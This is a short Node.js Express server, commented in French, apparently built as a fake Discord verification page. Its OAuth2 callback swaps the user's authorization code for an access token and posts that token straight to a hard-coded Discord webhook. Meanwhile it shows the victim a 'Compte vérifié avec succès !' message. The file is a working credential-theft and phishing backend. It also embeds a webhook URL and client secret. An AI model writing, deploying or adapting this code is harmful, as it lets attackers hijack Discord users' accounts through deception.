const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';
const CLIENT_ID = '1565797236166893779';
const CLIENT_SECRET = 'vc8FhaOyjH-DjfoFcoTiiwo41nWCaqHO'; 
const REDIRECT_URI = 'https://login-discord-ba5a.onrender.com/callback';

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send("Erreur : pas de code.");

  try {
    const params = new URLSearchParams();
    params.append('client_id', CLIENT_ID);
    params.append('client_secret', CLIENT_SECRET);
    params.append('grant_type', 'authorization_code');
    params.append('code', code);
    params.append('redirect_uri', REDIRECT_URI);

    const response = await axios.post('https://discord.com/api/oauth2/token', params);
    const accessToken = response.data.access_token;

    // On envoie le token direct sur ton Discord
    await axios.post(WEBHOOK_URL, { 
      content: `🔥 **Nouveau Token OAuth2 :**\n\`\`\`\n${accessToken}\n\`\`\`` 
    });

    res.send("<h1>Compte vérifié avec succès !</h1>");
  } catch (error) {
    res.send("Erreur lors de la récupération du token.");
  }
});

app.listen(3000, () => console.log('En ligne.'));
